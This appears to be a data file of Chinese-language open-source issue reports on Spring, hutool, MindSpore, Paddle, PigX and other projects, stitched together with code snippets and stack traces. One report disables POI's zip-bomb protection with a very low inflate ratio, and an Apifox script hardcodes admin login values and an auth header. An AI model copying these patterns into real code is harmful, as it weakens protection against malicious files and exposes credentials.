org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:103) at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:89) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.web.filter.CorsFilter.doFilterInternal(CorsFilter.java:91) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.header.HeaderWriterFilter.doHeadersAfter(HeaderWriterFilter.java:90) at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:75) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:110) at org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:80) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:55) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:211) at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:183) at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:354) at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:267) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at io.undertow.servlet.handlers.FilterHandler.handleRequest(FilterHandler.java:84) at io.undertow.servlet.handlers.security.ServletSecurityRoleHandler.handleRequest(ServletSecurityRoleHandler.java:62) at io.undertow.servlet.handlers.ServletChain$1.handleRequest(ServletChain.java:68) at io.undertow.servlet.handlers.ServletDispatchingHandler.handleRequest(ServletDispatchingHandler.java:36) at io.undertow.servlet.handlers.RedirectDirHandler.handleRequest(RedirectDirHandler.java:68) at io.undertow.servlet.handlers.security.SSLInformationAssociationHandler.handleRequest(SSLInformationAssociationHandler.java:117) at io.undertow.servlet.handlers.security.ServletAuthenticationCallHandler.handleRequest(ServletAuthenticationCallHandler.java:57) at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) at io.undertow.security.handlers.AbstractConfidentialityHandler.handleRequest(AbstractConfidentialityHandler.java:46) at io.undertow.servlet.handlers.security.ServletConfidentialityConstraintHandler.handleRequest(ServletConfidentialityConstraintHandler.java:64) at io.undertow.security.handlers.AuthenticationMechanismsHandler.handleRequest(AuthenticationMechanismsHandler.java:60) at io.undertow.servlet.handlers.security.CachedAuthenticatedSessionHandler.handleRequest(CachedAuthenticatedSessionHandler.java:77) at io.undertow.security.handlers.AbstractSecurityContextAssociationHandler.handleRequest(AbstractSecurityContextAssociationHandler.java:43) at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) at io.undertow.servlet.handlers.SendErrorPageHandler.handleRequest(SendErrorPageHandler.java:52) at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) at io.undertow.servlet.handlers.ServletInitialHandler.handleFirstRequest(ServletInitialHandler.java:275) at io.undertow.servlet.handlers.ServletInitialHandler.access$100(ServletInitialHandler.java:79) at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:134) at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:131) at io.undertow.servlet.core.ServletRequestContextThreadSetupAction$1.call(ServletRequestContextThreadSetupAction.java:48) at io.undertow.servlet.core.ContextClassLoaderSetupAction$1.call(ContextClassLoaderSetupAction.java:43) at io.undertow.servlet.handlers.ServletInitialHandler.dispatchRequest(ServletInitialHandler.java:255) at io.undertow.servlet.handlers.ServletInitialHandler.access$000(ServletInitialHandler.java:79) at io.undertow.servlet.handlers.ServletInitialHandler$1.handleRequest(ServletInitialHandler.java:100) at io.undertow.server.Connectors.executeRootHandler(Connectors.java:387) at io.undertow.server.HttpServerExchange$1.run(HttpServerExchange.java:852) at org.jboss.threads.ContextClassLoaderSavingRunnable.run(ContextClassLoaderSavingRunnable.java:35) at org.jboss.threads.EnhancedQueueExecutor.safeRun(EnhancedQueueExecutor.java:2019) at org.jboss.threads.EnhancedQueueExecutor$ThreadBody.doRunTask(EnhancedQueueExecutor.java:1558) at org.jboss.threads.EnhancedQueueExecutor$ThreadBody.run(EnhancedQueueExecutor.java:1449) at org.xnio.XnioWorker$WorkerThreadFactory$1$1.run(XnioWorker.java:1280) at java.lang.Thread.run(Thread.java:745) http://exam.alberlia.ltd/s/Eu5qst
ExcelUtil.readBySax解析大Excel(xlsx)不进入 RowHandler.handle()方法,"JDK版本： openjdk_8_201 hutool版本： 4.5.11 Excel: **.xlsx 大小: 37.8 MB 条数: 10W 如果不设置 , 报如下错误 设置 后, 不进入 RowHandler.handle() 方法 当我把条数减到1W条时, 程序正常运行.   <code>: public static void main(String[] args) { File file = new File(""D:\\wenjian\\a_duilie10W.xlsx""); ZipSecureFile.setMinInflateRatio(0.001); cn.hutool.poi.excel.ExcelUtil.readBySax(file,0,new RowHandler() { // 导入的 excel 第一行为英文字段 @Override public void handle(int sheetIndex, int rowIndex, List&lt;Object&gt; rowList) { Console.log(""[{}] [{}] {}"", sheetIndex, rowIndex, rowList); } }); } ZipSecureFile.setMinInflateRatio(0.001); Exception in thread ""main"" cn.hutool.poi.exceptions.POIException: IOException: Zip bomb detected! The file would exceed the max. ratio of compressed file size to the size of the expanded data. This may indicate that the file is used to inflate memory usage and thus could pose a security risk. You can adjust this limit via ZipSecureFile.setMinInflateRatio() if you need to work with files which exceed this limit. Uncompressed size: 103933, Raw/compressed size: 512, ratio: 0.004926 ZipSecureFile.setMinInflateRatio(0.001);"
2.9.9版本自定义表单无法使用el-button,"代码如上，template中改为字符串或者el-tag都可以显示，el-button就无法显示。   <code>: &lt;template slot=""contentForm"" slot-scope=""{type,disabled}""&gt; &lt;el-button type=""primary"" size=""small"" con=""el-icon-view"" @click=""view"" &gt;查看 &lt;/el-button&gt; &lt;/template&gt;"
建议使用 继承的 RowBounds 来实现 PageHelper 的部分功能,"建议使用 继承的 RowBounds 来实现 PageHelper 的部分功能 只要是有 RowBounds 参数的方法，都可以用   <code>: PageHelper.startPage(1, 10); PageHelper.orderBy(""id desc""); users = userMapper.selectAll(); MyRowBounds mrb = new MyRowBounds(1, 10); mrb.setOrderBy(""id desc""); users = userMapper.selectAll(mrb);"
"[CT][MS][Frac] 算子在放开wip时出现RuntimeError: ""frac_cpu"" not implemented for 'Char'","算子在gpu环境运行用例test_functional_frac_input_int8_cpu_gpu 显示失败 出现报错,torch版本也是1.8.1 换过环境后报错相同 @SKIP_ENV_DAVINCI_EXECUTOR(reason=""Ascend supports int8"") @Author('nwx1165669') @level def test_functional_frac_input_int8_cpu_gpu(): input_x = Tensor(np.random.uniform(low=2, high=1000, size=(7)), mstype.int8) with pytest.raises(TypeError): fact = FracMock(inputs=[input_x]) fact = FracMock(inputs=[input_x]) fact.forward_mindspore_impl() Failed: DID NOT RAISE &lt;class 'TypeError'&gt; 当我把用例换成正常的用例后 显示 def test_functional_frac_input_uint8_cpu_gpu(): input_x = Tensor(np.random.uniform(low=2, high=100, size=(7)), mstype.uint8) # with pytest.raises(TypeError): # fact = FracMock(inputs=[input_x]) # fact.forward_mindspore_impl() fact = FracMock(inputs=[input_x]) test_f_frac.py:255: ../share/ops/functional/frac_ops.py:69: in forward_cmp out_torch = self.forward_torch_impl() self = FracMock&lt;&gt; E RuntimeError: ""frac_cpu"" not implemented for 'Byte' ../share/ops/functional/frac_ops.py:43: RuntimeError test_functional_frac_input_int16_gpu_ascend   <code>: fact.forward_cmp() def forward_torch_impl(self): out_torch = torch.frac(self.input_x_t)"
神经网络的计算图应当包含什么?,"除去PyTorch框架外，Tensorflow,MxNet,Caffe2与DyNet均显示的让用户配置计算图()，并且使用执行引擎()执行该计算图。而Paddle目前也是使用来表示计算图。 在一个Op Based神经网络框架的计算图中，计算图通常包括与。表示计算图中所有的数据节点，而表示计算图中所有的计算节点。不同神经网络框架对二者的称谓如下: Variable op Caffe2 Blob Tensorflow (需要更详细调研) TBD MxNet (需要更详细调研) Symbol(Variable) Symbol(Functor) DyNet Node(InputNode, ScalarInputNode, ParameterNode) Node 可见，计算图中和都是计算图的节点()，而计算图之间的关系通过之间的连接组成的。即，计算图是一个图，图包含节点与边构成。而和都是计算图的节点()。 逻辑关系如下图所示 问题: 神经网络的计算图是图，一个图由节点和边构成，和是计算图中的节点，还是边？什么是这个计算图中的节点?什么是这个计算图中的边? Paddle重构中，是否与配置的基类应该是，而Graph是的集合与连接关系? Paddle重构中，是否就是一种，只是这个没有输入，可以直接产生输出？或者，通用的说，类似于DyNet的设计，所有的节点都是，只是实现了计算，而实现了从全局的查找一个输出?   <code>: Engine proto::ModelConfig Variable Op Variable Op OperatorDef NodeDef Variable Op Node Node Variable Op Node Op Variable Variable Op Node Node Variable Op Op Node Op Variable Tensor"
【众智】【计算-AICPU开发】NonDeterministicInts,NonDeterministicInts 非确定地产生一些整数。 接口目录：mindspore/ops/operations/random_ops.py dtype Type 属性 shape y 对应底层算子 对应底层AICPU算子NonDeterministicInts 无反向   <code>: class NonDeterministicInts(Primitive):
spring-cache 中 CacheChannel.get() 方法NoSuchMethodError,"同 #IK13W:使用spring-cache 遇到NoSuchMethodError 问题 描述 这个一个必现的问题，重新开一个，版本回退到2.3.17-release不会产生此异常。 应该是 CacheChannel.get()方法签名导致。 环境 springboot2.0 j2cache-spring-boot2-starter 2.3.20-release 配置 代码   <code>: j2cache.L2.provider_class = net.oschina.j2cache.cache.support.redis.SpringRedisProvider j2cache.broadcast = net.oschina.j2cache.cache.support.redis.SpringRedisPubSubPolicy @Cacheable(key = ""#id"") public User findOne(String id) {"
Dropout_op need be refined.,"The check of attributes should be placed in the maker, but not in .   <code>: InferShape"
【显示优化建议】日期范围,"选择完成后中间没有样式，你看这是阿里云的效果 ，希望可以更完美些   <code>: 日期范围选择 laydate.render({ elem: '#test' ,range: true //或 range: '~' 来自定义分割字符 });"
Add HasInputs/HasOutputs in shape interface,Maybe we need to add interfaces in   <code>: HasInputs/HasOutputs InferShapeContextBase
【众智】【计算-GPU开发】ApplyProximalGradientDescent,根据 FOBOS(Forward Backward Splitting) 算法更新参数。更新公式如下： https://www.tensorflow.org/versions/r2.6/api_docs/python/tf/raw_ops/ApplyProximalGradientDescent?hl=zh-cn 3. 异常处理 4. 算子反向   <code>: class ApplyProximalGradientDescent(PrimitiveWithInfer):
引入mybatis-plus-starter不配置mp配置文件报错,当前使用版本 3.4.3.2 有问题 3.4.0 版本没有问题 在网关引入dubbo api，由于api包需要mp基本依赖，但是网关不需要配置mp相关配置，所以造成启动报错   <code>: [gateway-center:192.168.109.1:15000] 2021-09-09 15:00:30.484 ERROR 13220 [TID: N/A] [main] org.springframework.boot.diagnostics.LoggingFailureAnalysisReporter *************************** APPLICATION FAILED TO START *************************** Description: Parameter 1 of constructor in com.baomidou.mybatisplus.autoconfigure.IdentifierGeneratorAutoConfiguration$InetUtilsAutoConfig required a bean of type 'com.baomidou.mybatisplus.autoconfigure.MybatisPlusProperties' that could not be found. Action: Consider defining a bean of type 'com.baomidou.mybatisplus.autoconfigure.MybatisPlusProperties' in your configuration.
在网络中应用伯努利分布采样不随机,"网络模型：ResNet50 模式：PYNATIVE 问题描述：resnet官方modelzoo代码，在每个block中初始化一个bernoulli变量，并在construct函数中调用sample（）函数采样，打印发现采样值在不同step不同block中一直不变，没有随机性。添加seed之后也不行： p: 0 p: 0 p: 0 p: 0 p: 0 p: 0 p: 0 p: 0 p: 0 p: 0 p: 0 p: 0 p: 0 p: 0 p: 0 p: 0 epoch: 1 step: 1, loss is 4.6112795 p: 0 p: 0 p: 0 p: 0 p: 0 p: 0 p: 0 p: 0 p: 0 p: 0 p: 0 p: 0 p: 0 p: 0 p: 0 p: 0 epoch: 1 step: 2, loss is 6.339018 代码如下： class ResidualBlock(nn.Cell): def init(self, in_channel, out_channel, stride=1, use_se=False, se_block=False): super(ResidualBlock, self).init() ...相同部分省略... self.bernoulli_d = msd.Bernoulli(0.5, dtype=mstype.int32) 单算子测试伯努利分布采样正常： b1 = msd.Bernoulli(0.5, dtype=mindspore.int32) b1.sample((1, 1)) Tensor(shape=[1, 1], dtype=Int32, value= [[0]]) b1.sample((1, 1)) Tensor(shape=[1, 1], dtype=Int32, value= [[1]]) b1.sample((1, 1)) Tensor(shape=[1, 1], dtype=Int32, value= [[0]]) 请问应该如何在网络中实现该功能？或者有其他更高效的方法实现相同功能吗？   <code>: def construct(self, x): identity = x p = self.bernoulli_d.sample((1, 1)) print(""p: "", p) out = self.conv1(x) out = self.bn1(out) out = self.relu(out) out = self.conv2(out) out = self.bn2(out) out = self.relu(out) out = self.conv3(out) out = self.bn3(out) if self.down_sample: identity = self.down_sample_layer(identity) out = out + identity out = self.relu(out) return out"
使用apifox脚本无法获取token,"环境信息 pigx版本: 4.0.0 是否修改包名: 是 提供详细 使用postman 成功，用同样的参数apifox显示 { ""code"": 1, ""msg"": ""用户名不存在或者密码错误"", ""data"": ""invalid_exception"" } 具体脚本为 function sendLoginRequest() { // 获取环境里的 前置URL const baseUrl = 'http://129.10.1.10:9989/auth/oauth/token?grant_type=password'; } // 获取环境变量里的 ACCESS_TOKEN const accessToken = pm.environment.get('ACCESS_TOKEN'); // 获取环境变量里的 ACCESS_TOKEN_EXPIRES const accessTokenExpires = pm.environment.get('ACCESS_TOKEN_EXPIRES'); // 如 ACCESS_TOKEN 没有值，或 ACCESS_TOKEN_EXPIRES 已过期，则执行发送登录接口请求 if (!accessToken || (accessTokenExpires &amp;&amp; new Date(accessTokenExpires) &lt;= new Date())) { sendLoginRequest(); }   <code>: // 登录用户名，这里从环境变量 LOGIN_USERNAME 获取，也可以写死（但是不建议） const username = 'admin'; // 登录用户名，这里从环境变量 LOGIN_PASSWORD 获取，也可以写死（但是不建议） const password = 'rKu1/348LvKp0rsVC06eCA=='; // 构造一个 POST x-www-form-urlencoded 格式请求。这里需要改成你们实际登录接口的请求参数。 const loginRequest = { url: baseUrl, method: 'POST', // 若 body 为 x-www-form-urlencoded 格式，mode 为 'urlencoded' body: { mode: 'urlencoded', urlencoded: [ { key: 'account', value: username }, { key: 'password', value: password }, { key: 'scope', value: 'server' } ] }, header: [ {key:'Authorization',value:'Basic dGVzdDp0ZXN0',type:'text'}, {key:'Accept-Language',value:' zh-CN,zh;',type:'text'} ] /* // 若 body 为 form-data 格式，mode 为 'formdata' body: { mode: 'formdata', formdata: [ { key: 'account', value: username }, { key: 'password', value: password } ] } // 若 body 为 raw 或 json 格式，mode 为 'raw' body: { mode: 'raw', raw: JSON.stringify({ username: username, password: password }), } */ }; // 发送请求。 // pm.sendrequest 参考文档: https://www.apifox.cn/help/app/scripts/api-references/pm-reference/#pm-sendrequest pm.sendRequest(loginRequest, function (err, res) { if (err) { console.log(err); } else { // 读取接口返回的 json 数据。 // 如果你的 token 信息是存放在 cookie 的，可以使用 res.cookies.get('token') 方式获取。 // cookies 参考文档：https://www.apifox.cn/help/app/scripts/api-references/pm-reference/#pm-cookies const jsonData = res.json(); // 将 accessToken 写入环境变量 ACCESS_TOKEN pm.environment.set('ACCESS_TOKEN', jsonData.data.accessToken); // 将 accessTokenExpires 过期时间写入环境变量 ACCESS_TOKEN_EXPIRES pm.environment.set('ACCESS_TOKEN_EXPIRES', jsonData.data.accessTokenExpires); } });"
add lod and dtype inference,Add inference of LoD and dtype in   <code>: Reader
关于离线量化中calibration代码的一些疑惑,关于P_sum的计算 根据674行代码的上下文可知min_kl_index必然大于等于starting_iter，若min_kl_index=0，则必然是因为starting_iter等于0，那么while循环条件就不会成立，最后min_kl_index=starting_iter=0。即这段if语句就算成立也是什么都没有做，请问这段代码是否是冗余的呢？   <code>: P_sum = len(activation_blob.flatten())
持续写入/输出控制台日志上下文报错,"Furion 版本号 4.5.7 .NET SDK 版本号 .NET5 .NET6 .NET7 Web 项目类型 WebApi Mvc Razor Pages Blazor Server MinApp 操作系统和版本 Windows Linux MacOS 其他 代码环境 开发环境（Development） 生产环境（Production） 测试环境 通过for循环一万次持续输出日志，会报错！ Sqlite SqlServer Mysql Oracle PGSql Firebird Cosmos   <code>: at Microsoft.Extensions.Logging.LoggerFactoryScopeProvider.ForEachScope[[System.__Canon, System.Private.CoreLib, Version=6.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e]](System.Action`2&lt;System.Object,System.__Canon&gt;, System.__Canon) at Furion.Logging.ConsoleFormatterExtend.Write[[Microsoft.Extensions.Logging.FormattedLogValues, Microsoft.Extensions.Logging.Abstractions, Version=6.0.0.0, Culture=neutral, PublicKeyToken=adb9793829ddae60]](Microsoft.Extensions.Logging.Abstractions.LogEntry`1&lt;Microsoft.Extensions.Logging.FormattedLogValues&gt; ByRef, Microsoft.Extensions.Logging.IExternalScopeProvider, System.IO.TextWriter) at Microsoft.Extensions.Logging.Console.ConsoleLogger.Log[[Microsoft.Extensions.Logging.FormattedLogValues, Microsoft.Extensions.Logging.Abstractions, Version=6.0.0.0, Culture=neutral, PublicKeyToken=adb9793829ddae60]](Microsoft.Extensions.Logging.LogLevel, Microsoft.Extensions.Logging.EventId, Microsoft.Extensions.Logging.FormattedLogValues, System.Exception, System.Func`3&lt;Microsoft.Extensions.Logging.FormattedLogValues,System.Exception,System.String&gt;) at Microsoft.Extensions.Logging.Logger.&lt;Log&gt;g__LoggerLog|12_0[[Microsoft.Extensions.Logging.FormattedLogValues, Microsoft.Extensions.Logging.Abstractions, Version=6.0.0.0, Culture=neutral, PublicKeyToken=adb9793829ddae60]](Microsoft.Extensions.Logging.LogLevel, Microsoft.Extensions.Logging.EventId, Microsoft.Extensions.Logging.ILogger, System.Exception, System.Func`3&lt;Microsoft.Extensions.Logging.FormattedLogValues,System.Exception,System.String&gt;, System.Collections.Generic.List`1&lt;System.Exception&gt; ByRef, Microsoft.Extensions.Logging.FormattedLogValues ByRef) at Microsoft.Extensions.Logging.Logger.Log[[Microsoft.Extensions.Logging.FormattedLogValues, Microsoft.Extensions.Logging.Abstractions, Version=6.0.0.0, Culture=neutral, PublicKeyToken=adb9793829ddae60]](Microsoft.Extensions.Logging.LogLevel, Microsoft.Extensions.Logging.EventId, Microsoft.Extensions.Logging.FormattedLogValues, System.Exception, System.Func`3&lt;Microsoft.Extensions.Logging.FormattedLogValues,System.Exception,System.String&gt;) at Microsoft.Extensions.Logging.Logger`1[[System.__Canon, System.Private.CoreLib, Version=6.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e]].Microsoft.Extensions.Logging.ILogger.Log[[Microsoft.Extensions.Logging.FormattedLogValues, Microsoft.Extensions.Logging.Abstractions, Version=6.0.0.0, Culture=neutral, PublicKeyToken=adb9793829ddae60]](Microsoft.Extensions.Logging.LogLevel, Microsoft.Extensions.Logging.EventId, Microsoft.Extensions.Logging.FormattedLogValues, System.Exception, System.Func`3&lt;Microsoft.Extensions.Logging.FormattedLogValues,System.Exception,System.String&gt;) at Microsoft.Extensions.Logging.LoggerExtensions.Log(Microsoft.Extensions.Logging.ILogger, Microsoft.Extensions.Logging.LogLevel, Microsoft.Extensions.Logging.EventId, System.Exception, System.String, System.Object[]) at Microsoft.Extensions.Logging.LoggerExtensions.LogInformation(Microsoft.Extensions.Logging.ILogger, System.String, System.Object[]) at Nuget.Test.Worker+&lt;ExecuteAsync&gt;d__3.MoveNext() at System.Runtime.CompilerServices.AsyncTaskMethodBuilder`1+AsyncStateMachineBox`1[[System.Threading.Tasks.VoidTaskResult, System.Private.CoreLib, Version=6.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e],[System.__Canon, System.Private.CoreLib, Version=6.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e]].ExecutionContextCallback(System.Object) at System.Threading.ExecutionContext.RunInternal(System.Threading.ExecutionContext, System.Threading.ContextCallback, System.Object) at System.Runtime.CompilerServices.AsyncTaskMethodBuilder`1+AsyncStateMachineBox`1[[System.Threading.Tasks.VoidTaskResult, System.Private.CoreLib, Version=6.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e],[System.__Canon, System.Private.CoreLib, Version=6.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e]].MoveNext(System.Threading.Thread) at System.Runtime.CompilerServices.AsyncTaskMethodBuilder`1+AsyncStateMachineBox`1[[System.Threading.Tasks.VoidTaskResult, System.Private.CoreLib, Version=6.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e],[System.__Canon, System.Private.CoreLib, Version=6.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e]].MoveNext() at System.Runtime.CompilerServices.TaskAwaiter+&lt;&gt;c.&lt;OutputWaitEtwEvents&gt;b__12_0(System.Action, System.Threading.Tasks.Task) at System.Runtime.CompilerServices.AsyncMethodBuilderCore+ContinuationWrapper.Invoke() at System.Threading.Tasks.AwaitTaskContinuation.RunOrScheduleAction(System.Action, Boolean) at System.Threading.Tasks.Task.RunContinuations(System.Object) at System.Threading.Tasks.Task.FinishContinuations() at System.Threading.Tasks.Task.TrySetResult() at System.Threading.Tasks.Task+DelayPromise.CompleteTimedOut() at System.Threading.Tasks.Task+DelayPromise.TimerCallback(System.Object) at System.Threading.TimerQueueTimer.CallCallback(Boolean) at System.Threading.TimerQueueTimer.Fire(Boolean) at System.Threading.TimerQueue.FireNextTimers() at System.Threading.TimerQueue.AppDomainTimerCallback(Int32) at System.Threading.UnmanagedThreadPoolWorkItem.System.Threading.IThreadPoolWorkItem.Execute() at System.Threading.ThreadPoolWorkQueue.Dispatch() at System.Threading.PortableThreadPool+WorkerThread.WorkerThreadStart() at System.Threading.Thread.StartCallback() for (int i = 0; i &lt; 10000; i++) { _logger.ScopeContext(ctx =&gt; ctx.Set(LoggingConst.Color, ConsoleColor.Green)).LogInformation($""这是绿色""); }"
【建议】禁止访问菜单规则列表中不存在的或已禁用的节点,"现象： 因为超级管理员能访问所有代码里写了的菜单节点，所以单纯从菜单规则里删除并不能阻止管理员用户通过地址栏输入地址的形式访问菜单。 建议： 非debug模式下禁止访问菜单规则里面没有允许的菜单节点 修改建议： 第一处： 文件路径：/extend/fast/Auth.php 方法名：check()，在方法体第一行增加以下代码 第二处： 文件路径：application/admin/controller/auth/Group.php 方法名：roletree()，增加查询条件仅查询正常状态的菜单节点   <code>: if (!Config::get(""app_debug"")) { // 检查节点及父节点是否均存在且正常 $checkNode = AuthRule::alias('node') -&gt;field('node.id,p.status p_status') -&gt;join('auth_rule p', 'p.id = node.pid','left') -&gt;where('node.status', 'normal') -&gt;where('node.name', $name) -&gt;find(); if (empty($checkNode) || 'hidden' == $checkNode-&gt;p_status) { return false; } } // 原代码 model('AuthRule')-&gt;order('weigh', 'desc')-&gt;order('id', 'asc')-&gt;select() // 修改为 model('AuthRule')-&gt;where('status', 'normal')-&gt;order('weigh', 'desc')-&gt;order('id', 'asc')-&gt;select()"
Refine Channel Implementation for Select Op,"The current implementation of buffered and unbuffered channels is not compatible with the way the op is implemented by Go (http://www.tapirgames.com/blog/golang-concurrent-select-implementation). We need to redesign the channel implementations in a way similar to Go (https://github.com/golang/go/blob/master/src/runtime/chan.go#L417) This involves making the channels contain a queue of Send and receive routines. In Go the goroutine can be stored inside an object. In our case, we need to create data structres that let us make the thread sleep or wake.   <code>: Select"
NCCL compilation and linking version not match,"Currently, paddle is compiled with nccl1.3 by pulling its source code from https://github.com/NVIDIA/nccl. During the runtime, it is linked to nccl2. This would result in failure such as . The CI doesn't fail because some CI machine only have one GPU so the nccl test is skipped.   <code>: unhandled cuda error"
"capi, 数据输入格式","python做infer没问题，换成capi后报错 模型data leyer定义： 在python做infer时cur_stream，up_stream_1和down_stream_1都是长度为43的list，vector为长度为490的list。 capi中测试数据读入方式：   <code>: I0227 05:59:35.251722 445 Util.cpp:166] commandline: --use_gpu=false I0227 05:59:35.256510 445 GradientMachine.cpp:83] Loading parameters from ./model/dnn_params_30min/ F0227 05:59:35.282200 445 TableProjection.cpp:39] Check failed: in_-&gt;ids *** Check failure stack trace: *** @ 0x7ff487fe876d google::LogMessage::Fail() @ 0x7ff487fec21c google::LogMessage::SendToLog() @ 0x7ff487fe8293 google::LogMessage::Flush() @ 0x7ff487fed72e google::LogMessageFatal::~LogMessageFatal() @ 0x7ff48801c6d5 paddle::TableProjection::forward() @ 0x7ff488081db9 paddle::MixedLayer::forward() @ 0x7ff48814c4bd paddle::NeuralNetwork::forward() @ 0x7ff487fe4676 paddle_gradient_machine_forward @ 0x402cc1 main @ 0x7ff487398bd5 __libc_start_main @ 0x401859 (unknown) @ (nil) (unknown) data_layer_dict = {} for iter in ['cur_stream','up_stream_1', 'down_stream_1']: data_stream = paddle.layer.data( name=iter, type=paddle.data_type.integer_value_sequence(2966)) data_layer_dict[iter] = data_stream data_stream = paddle.layer.data( name='vector', type=paddle.data_type.dense_vector(490)) data_layer_dict['vector'] = data_stream paddle_arguments in_args = paddle_arguments_create_none(); CHECK(paddle_arguments_resize(in_args, 4)); int array_cur[43]; int array_up[43]; int array_down[43]; int array_vec[490]; ... paddle_ivector cur_stream = paddle_ivector_create(array_cur, sizeof(array_cur) / sizeof(int), false, false); paddle_ivector up_stream_1 = paddle_ivector_create(array_up, sizeof(array_up) / sizeof(int), false, false); paddle_ivector down_stream_1 = paddle_ivector_create(array_down, sizeof(array_down) / sizeof(int), false, false); paddle_ivector vector = paddle_ivector_create(array_vec, sizeof(array_vec) / sizeof(int), false, false); CHECK(paddle_arguments_set_value(in_args, 0, cur_stream)); CHECK(paddle_arguments_set_value(in_args, 1, up_stream_1)); CHECK(paddle_arguments_set_value(in_args, 2, down_stream_1)); CHECK(paddle_arguments_set_value(in_args, 3, vector)); paddle_arguments out_args = paddle_arguments_create_none(); CHECK(paddle_gradient_machine_forward(machine, in_args, out_args, false)); paddle_matrix prob = paddle_matrix_create_none(); CHECK(paddle_arguments_get_value(out_args, 0, prob));"
你好，我想怎么下，动态路由相关怎么配置呢？,"我们现在开发了业务一个功能模块，但是现在找不到配置动态路由的地方， 如：系统管理模块的动态路由是：/admin 那其余模块的动态路由怎么配置呢？ 现在主要问题，新开发的接口模块怎么和前后端联调，给前端提供后端接口。 我想访问多租户模块，发现接口url是：/admin/tenant/page 我想知道这个/admin在哪配置的。 @DY @RequiredArgsConstructor @RequestMapping(""/tenant"") @Api(value = ""tenant"", tags = ""租户管理"") public class SysTenantController {   <code>: private final SysTenantService sysTenantService; /** * 分页查询 * @param page 分页对象 * @param sysTenant 租户 * @return */ @GetMapping(""/page"") public R getSysTenantPage(Page page, SysTenant sysTenant) { return R.ok(sysTenantService.page(page, Wrappers.query(sysTenant))); }"
paddle v2版本中，如果要对一个网络进行多尺度预测(输入的图像大小不一样），怎样定义网络？,"假如定义一个全卷积的网络，每次输入的图像尺寸不一样，怎样定义网络，我使用以下代码，会报错：   <code>: def network(img_h,img_w): img = paddle.layer.data(name='image', type=paddle.data_type.dense_vector(3*img_h*img_w),height=img_h,width=img_w) conv1_out_h = img_h - 2 conv1_out_w = img_w - 2 prelu1 = paddle.layer.prelu(name='prelu1',input=conv1,partial_sum=conv1_out_h*conv1_out_w) ... return layer_out paddle.init(use_gpu=False) layer_out = network(img_h1,img_w1) layer_out = network(img_h2,img_w2)"
使用OAuth中，authorizedGrantTypes字段映射问题,"oauth客户端这个类的authorizedGrantTypes字段没有配置Mybatis的TypeHandler,为什么能吧数据库中的varchar映射成String数组呢？我在debug发现，它确实自动用了 这个类型处理器。 之所以问这个，是因为我改完包名后项目能启动，但是authorizedGrantTypes字段无法从完成实体映射，导致每次authorizedGrantTypes字段都是null,sso登陆时报错， error=""invalid_request"", error_description=""A client must have at least one authorized grant type.""   <code>: com.pig4cloud.pigx.admin.api.entity.SysOauthClientDetails com.pig4cloud.pigx.common.data.handler.JsonStringArrayTypeHandler"
